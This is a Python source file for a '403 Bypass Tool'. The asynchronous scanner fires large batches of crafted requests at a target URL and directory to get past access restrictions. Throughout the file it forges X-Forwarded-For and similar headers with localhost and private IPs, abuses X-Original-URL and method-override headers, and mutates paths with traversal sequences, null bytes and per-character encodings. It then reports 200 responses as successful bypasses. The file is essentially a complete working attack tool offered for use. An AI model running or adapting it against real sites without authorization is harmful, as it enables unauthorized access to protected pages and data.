#!/usr/bin/env python3
"""
403 Bypass Tool - A  tool for bypassing 403 Forbidden responses
Author: Naja
Version: 2.0
"""

import asyncio
import argparse
import os
import sys
import time
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass
from functools import lru_cache
from pathlib import Path

import aiohttp
import tldextract
import validators
from colorama import init, Fore, Style
from pyfiglet import Figlet

# Initialize colorama
init()

class Config:
    """Configuration settings for the application"""
    TIMEOUT = 10
    MAX_RETRIES = 3
    CHUNK_SIZE = 1024
    LINE_WIDTH = 100
    
    # HTTP Method override headers
    METHOD_HEADERS = [
        "X-HTTP-Method",
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-Method",
        "X-Original-Method",
        "X-Rewrite-Method"
    ]
    
    # HTTP Methods to try
    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
    
    # IP Spoofing headers
    IP_HEADERS = [
        "X-Custom-IP-Authorization",
        "X-Forwarded-For",
        "X-Forward-For",
        "X-Remote-IP",
        "X-Originating-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Real-IP"
    ]
    
    # IP Values to try
    IP_VALUES = [
        "localhost", "localhost:80", "localhost:443",
        "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
        "2130706433", "0x7F000001", "0177.0000.0000.0001",
        "0", "127.1", "10.0.0.0", "10.0.0.1",
        "172.16.0.0", "172.16.0.1", "192.168.1.0", "192.168.1.1"
    ]
    
    # URL Rewrite headers
    REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL"]
    
    # Path manipulation patterns
    PATH_PAIRS = [["/", "//"], ["/.", "/./"]]
    PATH_LEADINGS = ["/%2e"]
    PATH_TRAILINGS = [
        "/", "..;/", "/..;/", "%20", "%09", "%00",
        ".json", ".css", ".html", "?", "??", "???",
        "?testparam", "#", "#test", "/."
    ]

@dataclass
class RequestResult:
    """Data class to store request results"""
    method: str
    url: str
    status_code: int
    content_length: int
    headers: Optional[Dict] = None
    error: Optional[str] = None

class DisplayManager:
    """Manages the display of scan results and progress"""
    
    def __init__(self):
        self.start_time = time.time()
        self.total_requests = 0
        self.completed_requests = 0
        self.successful_bypasses = 0
        self.failed_requests = 0
    
    def print_banner(self):
        """Display the application banner"""
        custom_fig = Figlet(font='slant')
        banner = custom_fig.renderText('403 Bypass')
        print(Fore.MAGENTA + Style.BRIGHT + banner + Style.RESET_ALL)
        
        # Print version and author info
        print(Fore.CYAN + Style.BRIGHT + "╔" + "═" * 78 + "╗")
        print(Fore.CYAN + Style.BRIGHT + "║" + Fore.YELLOW + Style.BRIGHT + 
              " 403 Bypass Tool v2.0 | Professional Security Scanner | Author: Naja" + 
              " " * 10 + Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "╚" + "═" * 78 + "╝" + Style.RESET_ALL)
        print("\n")
    
    def print_target_info(self, url: str, path: str):
        """Display target information"""
        print(Fore.CYAN + Style.BRIGHT + "╔" + "═" * 78 + "╗")
        print(Fore.CYAN + Style.BRIGHT + "║" + Fore.YELLOW + Style.BRIGHT + 
              f" Target: {url}{path}".ljust(78) + Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "╚" + "═" * 78 + "╝" + Style.RESET_ALL)
        print("\n")
    
    def print_progress(self, current: int, total: int):
        """Display progress bar"""
        width = 50
        percent = current / total
        filled = int(width * percent)
        bar = "█" * filled + "░" * (width - filled)
        elapsed = time.time() - self.start_time
        eta = (elapsed / current) * (total - current) if current > 0 else 0
        
        print(f"\r{Fore.CYAN}[{bar}] {percent*100:.1f}% | {current}/{total} | "
              f"Elapsed: {elapsed:.1f}s | ETA: {eta:.1f}s{Style.RESET_ALL}", end="")
    
    def print_result(self, result: RequestResult):
        """Display request result"""
        if result.error:
            print(f"\n{Fore.RED}✗ {result.error} for {result.url}{Style.RESET_ALL}")
            self.failed_requests += 1
            return
        
        self.completed_requests += 1
        
        # Get status emoji and color
        if result.status_code == 200:
            emoji = "✓"
            color = Fore.GREEN + Style.BRIGHT  # Bright green for success
            self.successful_bypasses += 1
        elif result.status_code in (301, 302):
            emoji = "↪"
            color = Fore.CYAN + Style.BRIGHT  # Bright cyan for redirects
        elif result.status_code == 403:
            emoji = "✗"
            color = Fore.RED + Style.BRIGHT  # Bright red for forbidden
        elif result.status_code == 404:
            emoji = "✗"
            color = Fore.MAGENTA + Style.BRIGHT  # Bright magenta for not found
        elif result.status_code in (400, 401, 402):
            emoji = "⚠"
            color = Fore.YELLOW + Style.BRIGHT  # Bright yellow for client errors
        elif result.status_code in (500, 501, 502, 503, 504):
            emoji = "⚠"
            color = Fore.RED + Style.BRIGHT  # Bright red for server errors
        else:
            emoji = "?"
            color = Fore.WHITE + Style.BRIGHT  # Bright white for unknown codes
        
        # Format the output
        method = f"{color}{result.method}{Style.RESET_ALL}"
        url = f"{Fore.CYAN}{result.url}{Style.RESET_ALL}"
        status = f"{color}{result.status_code}{Style.RESET_ALL}"
        size = f"{Fore.YELLOW}{result.content_length}{Style.RESET_ALL}"
        
        print(f"\n{emoji} {method} {url}")
        print(f"   Status: {status} | Size: {size} bytes")
        
        if result.headers:
            print(f"   Headers: {result.headers}")
    
    def print_summary(self):
        """Display scan summary"""
        elapsed = time.time() - self.start_time
        success_rate = (self.successful_bypasses / self.completed_requests * 100) if self.completed_requests > 0 else 0
        
        print("\n" + Fore.CYAN + Style.BRIGHT + "╔" + "═" * 78 + "╗")
        print(Fore.CYAN + Style.BRIGHT + "║" + Fore.YELLOW + Style.BRIGHT + 
              " Scan Summary".center(78) + Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "╠" + "═" * 78 + "╣")
        print(Fore.CYAN + Style.BRIGHT + "║" + 
              f" Total Requests: {self.total_requests}".ljust(78) + 
              Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "║" + 
              f" Successful Bypasses: {self.successful_bypasses}".ljust(78) + 
              Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "║" + 
              f" Failed Requests: {self.failed_requests}".ljust(78) + 
              Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "║" + 
              f" Success Rate: {success_rate:.1f}%".ljust(78) + 
              Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "║" + 
              f" Time Elapsed: {elapsed:.1f} seconds".ljust(78) + 
              Fore.CYAN + Style.BRIGHT + "║")
        print(Fore.CYAN + Style.BRIGHT + "╚" + "═" * 78 + "╝" + Style.RESET_ALL)

class RequestManager:
    """Handles HTTP requests and response processing"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[str] = []
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    @staticmethod
    @lru_cache(maxsize=128)
    def get_status_color(status_code: int) -> str:
        """Get color code for status code"""
        if status_code in (200, 201):
            return Fore.GREEN + Style.BRIGHT
        elif status_code in (301, 302):
            return Fore.BLUE + Style.BRIGHT
        elif status_code in (403, 404):
            return Fore.MAGENTA + Style.BRIGHT
        elif status_code == 500:
            return Fore.RED + Style.BRIGHT
        return Fore.WHITE + Style.BRIGHT
    
    async def make_request(self, method: str, url: str, headers: Optional[Dict] = None) -> Optional[RequestResult]:
        """Make HTTP request with retry logic"""
        if not self.session:
            self.session = aiohttp.ClientSession()
        
        for attempt in range(Config.MAX_RETRIES):
            try:
                async with self.session.request(
                    method, url, headers=headers, timeout=Config.TIMEOUT
                ) as response:
                    content = await response.read()
                    return RequestResult(
                        method=method,
                        url=url,
                        status_code=response.status,
                        content_length=len(content),
                        headers=headers
                    )
            except aiohttp.ClientError as e:
                if attempt == Config.MAX_RETRIES - 1:
                    return RequestResult(
                        method=method,
                        url=url,
                        status_code=0,
                        content_length=0,
                        error=f"Connection Error: {str(e)}"
                    )
            except asyncio.TimeoutError:
                if attempt == Config.MAX_RETRIES - 1:
                    return RequestResult(
                        method=method,
                        url=url,
                        status_code=0,
                        content_length=0,
                        error="Request timed out"
                    )
            except Exception as e:
                if attempt == Config.MAX_RETRIES - 1:
                    return RequestResult(
                        method=method,
                        url=url,
                        status_code=0,
                        content_length=0,
                        error=f"Unexpected error: {str(e)}"
                    )
            await asyncio.sleep(1)  # Wait before retry
    
    def save_results(self, domain: str):
        """Save results to file"""
        if self.results:
            with open(f"{domain}.txt", "a") as f:
                f.writelines(f"{line}\n" for line in self.results)

class PathGenerator:
    """Generates various path and header combinations for testing"""
    
    def __init__(self, base_path: str):
        self.base_path = base_path
        self.paths: Set[str] = set()
        self.headers: List[Dict] = []
        self.method_headers: List[Dict] = []
        
        self._generate_paths()
        self._generate_headers()
        self._generate_method_headers()
    
    def _generate_paths(self):
        """Generate all possible path variations"""
        self.paths.add(self.base_path)
        
        # Add path pairs
        for prefix, suffix in Config.PATH_PAIRS:
            self.paths.add(f"{prefix}{self.base_path}{suffix}")
        
        # Add leading patterns
        for lead in Config.PATH_LEADINGS:
            self.paths.add(f"{lead}{self.base_path}")
        
        # Add trailing patterns
        for trail in Config.PATH_TRAILINGS:
            self.paths.add(f"{self.base_path}{trail}")
            
        # URL encoding patterns
        encodings = [
            "%20", "%2e", "%2f", "%3a", "%3b", "%3d", "%3f", "%40",
            "%5c", "%7e", "%25", "%2d", "%2b", "%2a", "%23", "%26",
            "%3c", "%3e", "%5b", "%5d", "%7b", "%7d", "%7c", "%5e",
            "%60", "%27", "%22", "%3f", "%2f", "%5c", "%2a", "%3f",
            "%3a", "%40", "%26", "%3d", "%2b", "%24", "%2c", "%3b",
            "%3c", "%3e", "%23", "%25", "%7b", "%7d", "%7c", "%5c",
            "%5e", "%7e", "%5b", "%5d", "%60", "%27", "%22", "%3c",
            "%3e", "%23", "%25", "%7b", "%7d", "%7c", "%5c", "%5e",
            "%7e", "%5b", "%5d", "%60", "%27", "%22"
        ]
        
        # Generate variations for each character in the path
        for i, char in enumerate(self.base_path):
            if char != '/':  # Skip encoding forward slashes
                for encoding in encodings:
                    # Replace the character with its encoded version
                    encoded_path = self.base_path[:i] + encoding + self.base_path[i+1:]
                    self.paths.add(encoded_path)
                    
                    # Also try double encoding
                    double_encoded = self.base_path[:i] + encoding + encoding + self.base_path[i+1:]
                    self.paths.add(double_encoded)
    
    def _generate_headers(self):
        """Generate IP spoofing and rewrite headers"""
        # IP spoofing headers
        self.headers.extend([
            {header: value} 
            for header in Config.IP_HEADERS 
            for value in Config.IP_VALUES
        ])
        
        # URL rewrite headers
        self.headers.extend([
            {header: self.base_path} 
            for header in Config.REWRITE_HEADERS
        ])
    
    def _generate_method_headers(self):
        """Generate HTTP method override headers"""
        self.method_headers.extend([
            {header: method} 
            for header in Config.METHOD_HEADERS 
            for method in Config.HTTP_METHODS
        ])

class Scanner:
    """Main scanner class that orchestrates the testing process"""
    
    def __init__(self, url: str, path: str):
        self.url = url.rstrip("/")
        self.path = path
        self.domain = tldextract.extract(self.url).domain
        self.path_generator = PathGenerator(path)
        self.request_manager = RequestManager()
        self.display = DisplayManager()
    
    async def scan(self):
        """Perform the scanning process"""
        self.display.print_target_info(self.url, self.path)
        
        # Calculate total requests
        total_requests = (
            1 +  # POST request
            len(self.path_generator.paths) +
            len(self.path_generator.headers) +
            len(self.path_generator.method_headers)
        )
        self.display.total_requests = total_requests
        
        async with self.request_manager:
            # Test POST request
            result = await self.request_manager.make_request("POST", f"{self.url}{self.path}")
            if result:
                self.display.print_result(result)
            
            # Test all path variations
            path_tasks = [
                self.request_manager.make_request("GET", f"{self.url}{path}")
                for path in self.path_generator.paths
            ]
            for i, result in enumerate(await asyncio.gather(*path_tasks), 1):
                if result:
                    self.display.print_result(result)
                self.display.print_progress(i, total_requests)
            
            # Test all headers
            header_tasks = [
                self.request_manager.make_request("GET", f"{self.url}{self.path}", header)
                for header in self.path_generator.headers
            ]
            for i, result in enumerate(await asyncio.gather(*header_tasks), len(path_tasks) + 1):
                if result:
                    self.display.print_result(result)
                self.display.print_progress(i, total_requests)
            
            # Test method override headers
            method_tasks = [
                self.request_manager.make_request("GET", f"{self.url}{self.path}", header)
                for header in self.path_generator.method_headers
            ]
            for i, result in enumerate(await asyncio.gather(*method_tasks), 
                                     len(path_tasks) + len(header_tasks) + 1):
                if result:
                    self.display.print_result(result)
                self.display.print_progress(i, total_requests)
        
        # Save results and display summary
        self.request_manager.save_results(self.domain)
        self.display.print_summary()

class ArgumentParser:
    """Handles command line argument parsing and validation"""
    
    def __init__(self):
        self.parser = argparse.ArgumentParser(
            description="403 Bypass Tool - A  tool for bypassing 403 Forbidden responses"
        )
        self._setup_arguments()
    
    def _setup_arguments(self):
        """Setup command line arguments"""
        self.parser.add_argument(
            "-u", "--url", type=str,
            help="Single URL to scan, ex: http://example.com"
        )
        self.parser.add_argument(
            "-U", "--urllist", type=str,
            help="Path to list of URLs, ex: urllist.txt"
        )
        self.parser.add_argument(
            "-d", "--dir", type=str,
            help="Single directory to scan, ex: /admin",
            nargs="?", const="/"
        )
        self.parser.add_argument(
            "-D", "--dirlist", type=str,
            help="Path to list of directories, ex: dirlist.txt"
        )
        self.parser.add_argument(
            "-t", "--threads", type=int,
            help="Number of concurrent threads (default: 10)",
            default=10
        )
    
    def parse(self) -> Tuple[List[str], List[str]]:
        """Parse and validate arguments"""
        args = self.parser.parse_args()
        
        # Validate and collect URLs
        urls = self._process_urls(args.url, args.urllist)
        
        # Validate and collect directories
        dirs = self._process_dirs(args.dir, args.dirlist)
        
        return urls, dirs
    
    def _process_urls(self, url: Optional[str], urllist: Optional[str]) -> List[str]:
        """Process URL arguments"""
        urls = []
        
        if url:
            if not validators.url(url):
                self.parser.error("Invalid URL provided")
            urls.append(url.rstrip("/"))
        elif urllist:
            if not os.path.exists(urllist):
                self.parser.error("URL list file does not exist")
            with open(urllist) as f:
                urls = [line.strip().rstrip("/") for line in f if line.strip()]
        else:
            self.parser.error("Either --url or --urllist must be provided")
        
        return urls
    
    def _process_dirs(self, dir: Optional[str], dirlist: Optional[str]) -> List[str]:
        """Process directory arguments"""
        dirs = []
        
        if dir:
            if not dir.startswith("/"):
                dir = "/" + dir
            if dir.endswith("/") and dir != "/":
                dir = dir.rstrip("/")
            dirs.append(dir)
        elif dirlist:
            if not os.path.exists(dirlist):
                self.parser.error("Directory list file does not exist")
            with open(dirlist) as f:
                dirs = [line.strip() for line in f if line.strip()]
        else:
            dirs = ["/"]
        
        return dirs

async def main():
    """Main entry point"""
    display = DisplayManager()
    display.print_banner()
    
    # Parse arguments
    parser = ArgumentParser()
    urls, dirs = parser.parse()
    
    # Process each URL and directory combination
    tasks = []
    for url in urls:
        for dir in dirs:
            scanner = Scanner(url, dir)
            tasks.append(scanner.scan())
    
    # Run all tasks concurrently
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main()) 